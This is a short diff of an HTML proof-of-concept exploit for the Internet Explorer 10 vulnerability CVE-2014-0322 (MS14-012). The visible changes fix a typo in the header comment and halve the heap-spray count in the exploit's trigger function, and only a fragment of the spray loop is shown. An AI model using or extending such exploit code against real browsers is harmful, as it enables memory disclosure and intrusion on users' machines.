@@ -1,7 +1,7 @@
 <!--
 This is a PoC to use MS14-012/CVE-2014-0322 to get memory disclosure using @tombkeeper's jscript9 object spray technique. 
 I have tested this with a stock Windows 8 install with IE10.. your mileage may vary.
-Original Poc: Jean-Jamil Khalife (http://www.hdwsec.fr)
+Original PoC: Jean-Jamil Khalife (http://www.hdwsec.fr)
 -->
 
 <html>
@@ -97,7 +97,7 @@ String.prototype.hexEncode = function(){
 function trigger()
 {
 	var derp = "AA";
-	var count = 0x2000000;
+	var count = 0x1000000;
 	var strAttr = new Array(count);
 	for (var i = 0; i < count; i++) {
      		strAttr[i] = derp.substr(0,2);
